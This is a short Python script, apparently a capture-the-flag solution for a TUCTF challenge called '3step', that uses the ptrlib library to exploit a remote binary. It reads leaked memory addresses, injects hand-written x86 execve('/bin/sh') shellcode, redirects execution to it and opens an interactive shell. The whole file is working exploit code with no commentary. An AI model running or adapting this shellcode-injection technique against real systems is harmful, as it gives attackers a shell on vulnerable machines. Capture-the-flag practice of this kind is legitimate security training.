from ptrlib import *
import time

#sock = Process("./3step")
sock = Socket("chal.tuctf.com", 30504)

time.sleep(1)
sock.recvline()
sock.recvline()
addr_buf1 = int(sock.recvline(), 16)
addr_stack = int(sock.recvline(), 16)
sock.sendafter(": ", "/bin/sh\x00")
sock.sendafter(": ", b"\x31\xC9\x31\xD2\xBB" + p32(addr_buf1) + b"\xB8\x0B\x00\x00\x00\xCD\x80")
sock.sendafter(": ", p32(addr_stack))

sock.interactive()
